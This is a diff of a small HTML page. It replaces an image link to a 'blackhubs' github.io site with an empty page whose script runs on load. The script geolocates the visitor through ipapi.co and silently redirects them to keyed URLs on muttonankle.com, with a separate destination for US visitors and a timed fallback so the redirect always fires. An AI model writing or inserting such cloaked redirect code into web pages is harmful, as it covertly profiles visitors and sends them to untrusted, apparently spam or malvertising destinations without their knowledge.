@@ -1,44 +1,37 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+let redirected = false;
 
-<style>
-body {
-    margin: 0;
-    background: #f5f5f5;
+const fallback = setTimeout(() => {
+    if (!redirected) {
+        redirected = true;
+        window.location.href = "https://muttonankle.com/yhu07yngim?key=67667a47d5a824e96f2f2c80b04b7bb9";
+    }
+}, 1500);
 
-    display: flex;
-    justify-content: center;
-    align-items: center;
+// geo detect
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
 
-    min-height: 100vh;
-}
+    if (redirected) return;
 
-/* container */
-.video-box {
-    width: 95%;
-    max-width: 700px; /* biar lebih gede di PC */
-}
+    let url = "https://muttonankle.com/yhu07yngim?key=67667a47d5a824e96f2f2c80b04b7bb9";
 
-/* gambar */
-.video-box img {
-    width: 100%;
-    height: auto;
-    border-radius: 12px;
-    display: block;
-}
-</style>
+    if (data.country === "US") {
+        url = "https://muttonankle.com/x2ucp3bjwp?key=190a75fea014dc036962f6a83a8819e6";
+    }
+
+    redirected = true;
+    clearTimeout(fallback);
+    window.location.href = url;
+})
+.catch(() => {
+
+});
+</script>
 </head>
-
-<body>
-
-<a href="https://blackhubs-official.github.io/congenial-palm-tree/">
-    <div class="video-box">
-        <img src="https://cdn.aceimg.com/b474c419b.jpg">
-    </div>
-</a>
-
-</body>
+<body></body>
 </html>
